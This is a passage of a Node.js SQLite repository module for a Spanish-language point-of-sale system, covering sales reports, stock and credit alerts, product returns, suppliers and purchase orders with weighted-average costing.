             SUM(si.unit_cost * si.qty) as cost
      FROM sales s
      LEFT JOIN sale_items si ON s.id = si.sale_id
      WHERE s.status='completed' AND s.type != 'devolucion' AND ${dateFilter}
      GROUP BY day
      ORDER BY day ASC
    `).all();

    // Abonos recibidos en el período
    const abonosData = db.prepare(`
      SELECT COUNT(*) as count, SUM(amount) as total
      FROM payments
      WHERE date(created_at,'localtime') IN (
        SELECT date(created_at,'localtime') FROM sales WHERE ${dateFilterNoAlias}
      )
    `).get();

    const totalRev    = byMethod.reduce((a, m) => a + (m.total || 0), 0);
    const totalCost   = costData?.total_cost   || 0;
    const totalTax    = taxData?.total_tax      || 0;
    const totalDisc   = discData?.total_discount || 0;
    const totalUnits  = costData?.total_units    || 0;
    const totalSales  = costData?.total_sales    || 0;
    const grossProfit = totalRev - totalCost;
    const netRev      = totalRev - totalTax;
    const margin      = totalRev > 0 ? (grossProfit / totalRev) * 100 : 0;

    return {
      byMethod,
      totalRev, totalCost, totalTax, totalDisc,
      totalUnits, totalSales,
      grossProfit, netRev, margin,
      topProducts,
      dailySales,
      devolucion: { count: devData?.count || 0, total: devData?.total || 0 },
      abonos:     { count: abonosData?.count || 0, total: abonosData?.total || 0 },
    };
  },

  lowStock() {
    return db.prepare(`
      SELECT * FROM products WHERE active=1 AND stock <= stock_min ORDER BY stock ASC
    `).all();
  },

  creditAlerts() {
    const today = todayStr();
    return db.prepare(`
      SELECT * FROM customers
      WHERE active=1 AND balance > 0 AND id != 1
        AND (credit_due IS NULL OR credit_due <= date('now','+5 days'))
      ORDER BY credit_due ASC
    `).all();
  },
};

// ── Helper fechas ─────────────────────────────
function addDaysStr(dateStr, n) {
  const d = new Date(dateStr + 'T12:00');
  d.setDate(d.getDate() + n);
  return d.toISOString().split('T')[0];
}

// ══════════════════════════════════════════════
// DEVOLUCIONES
// ══════════════════════════════════════════════
const returnsRepo = {
  /**
   * Procesa una devolución parcial o total de una venta.
   * - Crea una venta de tipo 'devolucion' vinculada a la original
   * - Repone stock de los artículos devueltos
   * - Si la venta original era a crédito, reduce el balance del cliente
   * - Registra movimiento de caja si aplica (devolución en efectivo)
   * - Todo en una sola transacción — si algo falla, revierte todo
   */
  create({ originalSaleId, items, session, user, reason = '' }) {
    const createReturnTx = db.transaction(() => {
      // 1. Verificar que la venta original existe y no está ya cancelada
      const original = db.prepare('SELECT * FROM sales WHERE id=?').get(originalSaleId);
      if (!original) throw new Error('Venta original no encontrada');
      if (original.status === 'cancelled') throw new Error('La venta ya está anulada');

      // 2. Verificar que los items a devolver existen en la venta original
      const originalItems = db.prepare('SELECT * FROM sale_items WHERE sale_id=?').all(originalSaleId);
      for (const item of items) {
        const orig = originalItems.find(oi => oi.product_id === item.product_id);
        if (!orig) throw new Error(`Producto ID ${item.product_id} no pertenece a esta venta`);
        if (item.qty > orig.qty) throw new Error(`Cantidad a devolver (${item.qty}) supera lo vendido (${orig.qty})`);
      }

      // 3. Calcular totales de la devolución (usando precios históricos del snapshot)
      const subtotal = items.reduce((a, i) => a + i.unit_price * i.qty, 0);
      const taxPct   = original.tax_pct || 0;
      const taxAmt   = subtotal * (taxPct / 100);
      const total    = subtotal + taxAmt;

      // 4. Crear venta de tipo 'devolucion'
      const retR = db.prepare(`
        INSERT INTO sales(
          cash_session_id, customer_id, customer_name, customer_rnc,
          type, status, subtotal, discount_pct, discount_amt,
          tax_pct, tax_amt, total, payment_method, price_mode,
          cajero, user_id, notes, original_sale_id
        ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
      `).run(
        session?.id || original.cash_session_id || null,
        original.customer_id,
        original.customer_name,
        original.customer_rnc,
        'devolucion', 'completed',
        subtotal, 0, 0,
        taxPct, taxAmt, total,
        original.payment_method,
        original.price_mode || 'retail',
        user.name || '',
        user.id,
        reason || `Devolución de venta #${originalSaleId}`,
        originalSaleId
      );
      const returnId = retR.lastInsertRowid;

      // 5. Insertar items de la devolución y reponer stock
      for (const item of items) {
        db.prepare(`
          INSERT INTO sale_items(sale_id, product_id, product_code, product_name, unit_cost, unit_price, qty, subtotal)
          VALUES(?,?,?,?,?,?,?,?)
        `).run(returnId, item.product_id, item.product_code, item.product_name,
               item.unit_cost || 0, item.unit_price, item.qty, item.unit_price * item.qty);

        // Reponer stock con registro de movimiento
        productsRepo.adjustStock(
          item.product_id, +item.qty, 'devolucion',
          `Devolución de venta #${originalSaleId}`, returnId, user.id
        );
      }

      // 6. Si la venta original era a crédito, reducir balance del cliente
      if (original.payment_method === 'credito' && original.customer_id !== 1) {
        const cust = db.prepare('SELECT balance FROM customers WHERE id=?').get(original.customer_id);
        if (cust) {
          const newBal = Math.max(0, (cust.balance || 0) - total);
          db.prepare(`UPDATE customers SET balance=?,updated_at=datetime('now') WHERE id=?`)
            .run(newBal, original.customer_id);
        }
      }

      // 7. Registrar movimiento de caja (la devolución sale de caja si era efectivo)
      if (session?.id && original.payment_method === 'efectivo') {
        cashRepo.addMovement({
          sessionId: session.id,
          type: 'devolucion',
          amount: -total,
          method: 'efectivo',
          referenceId: returnId,
          description: `Devolución venta #${originalSaleId}`,
          userId: user.id,
        });
      }

      // 8. Marcar venta original como 'returned' si todos los items fueron devueltos
      const allReturned = items.every(i => {
        const orig = originalItems.find(oi => oi.product_id === i.product_id);
        return orig && i.qty >= orig.qty;
      });
      if (allReturned && items.length >= originalItems.length) {
        db.prepare(`UPDATE sales SET status='returned' WHERE id=?`).run(originalSaleId);
      }

      // 9. Auditoría
      audit(user.id, user.name, 'devolucion_procesada', 'sales', returnId,
        `Venta original #${originalSaleId} | Total devuelto: ${total} | Items: ${items.length}`);

      return { returnId, total, subtotal, taxAmt };
    });

    return createReturnTx();
  },
};

// ══════════════════════════════════════════════
// PROVEEDORES
// ══════════════════════════════════════════════
const suppliersRepo = {
  getAll() {
    return db.prepare(`SELECT * FROM suppliers WHERE status='activo' ORDER BY name`).all();
  },
  getById(id) {
    return db.prepare(`SELECT * FROM suppliers WHERE id=?`).get(id);
  },
  create(s) {
    const r = db.prepare(`
      INSERT INTO suppliers(name,contact,phone,email,rnc,address,notes)
      VALUES(?,?,?,?,?,?,?)
    `).run(s.name, s.contact||'', s.phone||'', s.email||'',
           s.rnc||'', s.address||'', s.notes||'');
    return r.lastInsertRowid;
  },
  update(id, s) {
    db.prepare(`
      UPDATE suppliers SET name=?,contact=?,phone=?,email=?,rnc=?,address=?,notes=?
      WHERE id=?
    `).run(s.name, s.contact||'', s.phone||'', s.email||'',
           s.rnc||'', s.address||'', s.notes||'', id);
  },
  delete(id) {
    db.prepare(`UPDATE suppliers SET status='inactivo' WHERE id=?`).run(id);
  },
};

// ══════════════════════════════════════════════
// ORDENES DE COMPRA
// ══════════════════════════════════════════════
const purchasesRepo = {
  getAll({ range = 'all', supplierId } = {}) {
    let where = "WHERE 1=1";
    const params = [];
    if (supplierId) { where += ' AND po.supplier_id=?'; params.push(supplierId); }
    if (range === 'today') {
      where += ` AND date(po.created_at)=date('now','localtime')`;
    } else if (range === 'month') {
      where += ` AND strftime('%Y-%m',po.created_at)=strftime('%Y-%m','now','localtime')`;
    }
    return db.prepare(`
      SELECT po.*, s.name as supplier_name_join
      FROM purchase_orders po
      LEFT JOIN suppliers s ON po.supplier_id = s.id
      ${where}
      ORDER BY po.created_at DESC LIMIT 200
    `).all(...params);
  },

  getById(id) {
    const po    = db.prepare(`SELECT * FROM purchase_orders WHERE id=?`).get(id);
    if (!po) return null;
    po.items    = db.prepare(`SELECT * FROM purchase_items WHERE purchase_order_id=?`).all(id);
    return po;
  },

  create({ supplierId, supplierName, items, notes, userId, cajero }) {
    return db.transaction(() => {
      // Calcular totales
      const subtotal = items.reduce((s, i) => s + (i.unit_cost * i.qty_ordered), 0);
      const total    = subtotal;

      const r = db.prepare(`
        INSERT INTO purchase_orders(supplier_id, supplier_name, status, subtotal, total, notes, user_id, cajero)
        VALUES(?,?,?,?,?,?,?,?)
      `).run(supplierId || null, supplierName || '', 'pendiente',
             subtotal, total, notes || '', userId, cajero || '');
      const poId = r.lastInsertRowid;

      for (const item of items) {
        db.prepare(`
          INSERT INTO purchase_items(purchase_order_id, product_id, product_code, product_name, unit_cost, qty_ordered, qty_received, subtotal)
          VALUES(?,?,?,?,?,?,0,?)
        `).run(poId, item.product_id || null, item.product_code || '',
               item.product_name, item.unit_cost, item.qty_ordered,
               item.unit_cost * item.qty_ordered);
      }

      return { poId, total };
    })();
  },

  receive(id, { items, userId }) {
    return db.transaction(() => {
      const po = db.prepare(`SELECT * FROM purchase_orders WHERE id=?`).get(id);
      if (!po) throw new Error('Orden no encontrada');
      if (po.status === 'recibido') throw new Error('Esta orden ya fue recibida completamente');

      let allReceived = true;

      for (const item of items) {
        if (!item.qty_received || item.qty_received <= 0) continue;

        // Actualizar item de la orden
        db.prepare(`
          UPDATE purchase_items SET qty_received = qty_received + ?
          WHERE id=? AND purchase_order_id=?
        `).run(item.qty_received, item.id, id);

        // Actualizar stock y costo promedio ponderado
        if (item.product_id) {
          // 1. Leer stock y costo actuales ANTES de ajustar
          const prodActual = db.prepare(
            `SELECT stock, cost FROM products WHERE id=?`
          ).get(item.product_id);

          const stockActual   = prodActual?.stock  || 0;
          const costoActual   = prodActual?.cost   || 0;
          const stockNuevo    = item.qty_received;
          const costoNuevo    = item.unit_cost;

          // 2. Calcular costo — promedio ponderado para nuevos, fijo para especiales
          const esEspecial = ['usado','reacondicionado','consignacion','especial']
                              .includes(prodActual?.condition || 'nuevo');
          let costoPromedio = costoActual;
          if (costoNuevo > 0) {
            if (esEspecial) {
              // Producto usado/especial: costo fijo, no promedio
              costoPromedio = costoNuevo;
            } else if ((stockActual + stockNuevo) > 0) {
              // Producto nuevo: costo promedio ponderado
              costoPromedio = (
                (stockActual * costoActual) + (stockNuevo * costoNuevo)
              ) / (stockActual + stockNuevo);
              costoPromedio = Math.round(costoPromedio * 100) / 100;
            }
          }

          // 3. Ajustar stock
          productsRepo.adjustStock(
            item.product_id, item.qty_received, 'entrada',
            `Recepción OC #${id} | Costo unit: ${costoNuevo} | Promedio: ${costoPromedio}`,
            null, userId
          );

          // 4. Siempre actualizar al costo promedio ponderado
          // Las ventas históricas NO se ven afectadas porque tienen su snapshot en sale_items
          if (costoNuevo > 0) {
            db.prepare(
              `UPDATE products SET cost=?, updated_at=datetime('now') WHERE id=?`
            ).run(costoPromedio, item.product_id);
          }
        }
      }

      // Verificar si todos los items fueron recibidos completamente
      const pendingItems = db.prepare(`
        SELECT COUNT(*) as c FROM purchase_items
        WHERE purchase_order_id=? AND qty_received < qty_ordered
      `).get(id);

      const newStatus = pendingItems.c === 0 ? 'recibido' : 'parcial';

      db.prepare(`
        UPDATE purchase_orders SET status=?, received_at=datetime('now') WHERE id=?
      `).run(newStatus, id);

      audit(userId, '', 'compra_recibida', 'purchase_orders', id,
            `OC #${id} | Status: ${newStatus}`);

      return { status: newStatus };
    })();
  },

  cancel(id, userId) {
    db.prepare(`UPDATE purchase_orders SET status='cancelado' WHERE id=?`).run(id);
    audit(userId, '', 'compra_cancelada', 'purchase_orders', id, `OC #${id} cancelada`);
  },
};

// ══════════════════════════════════════════════
// EXPORTS
// ══════════════════════════════════════════════
module.exports = {
  suppliersRepo,
  purchasesRepo,
  initDB,
  authRepo,
  settingsRepo,
  usersRepo,
  productsRepo,
  customersRepo,
  cashRepo,
  salesRepo,
  returnsRepo,
  reportsRepo,
  audit,
  getDB: () => db,
};